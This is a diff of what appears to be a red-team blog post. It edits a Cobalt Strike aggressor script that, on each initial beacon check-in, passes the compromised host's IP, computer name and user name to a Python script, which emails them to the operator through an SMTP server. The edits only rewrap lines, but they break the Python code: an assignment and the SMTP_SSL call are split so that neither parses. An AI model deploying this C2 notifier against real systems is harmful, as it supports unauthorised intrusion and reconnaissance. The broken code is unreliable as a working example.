@@ -24,11 +24,13 @@ The aggressor script can be seen below, and is simply placed within the 'on beac
 {% highlight powershell %}
 on beacon_initial {
     println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
-
     local('$internalIP $computerName $userName');
-    $internalIP = replace(beacon_info($1,"internal")," ","_");
-    $computerName = replace(beacon_info($1,"computer")," ","_");
-    $userName = replace(beacon_info($1,"user")," ","_");
+    $internalIP = 
+    replace(beacon_info($1,"internal")," ","_");
+    $computerName = 
+    replace(beacon_info($1,"computer")," ","_");
+    $userName = 
+    replace(beacon_info($1,"user")," ","_");
     $cmd = '/home/kali/emailme.py --computername ' . $computerName . " --internalip " . $internalIP . " --username " . $userName;
     exec($cmd);
 }
@@ -47,7 +49,8 @@ import smtplib
 import argparse
 from email.mime.text import MIMEText
 
-parser = argparse.ArgumentParser(description='beacon info')
+parser = 
+argparse.ArgumentParser(description= 'beacon info')
 parser.add_argument('--computername')
 parser.add_argument('--internalip')
 parser.add_argument('--username')
@@ -67,7 +70,8 @@ def send_email(subject, body, sender, recipients, password):
     msg['Subject'] = subject
     msg['From'] = sender
     msg['To'] = ', '.join(recipients)
-    with smtplib.SMTP_SSL('smtp.yoursmtp.com', 465) as smtp_server:
+    with smtplib.SMTP_SSL
+    ('smtp.yoursmtp.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())
     print("Message sent!")
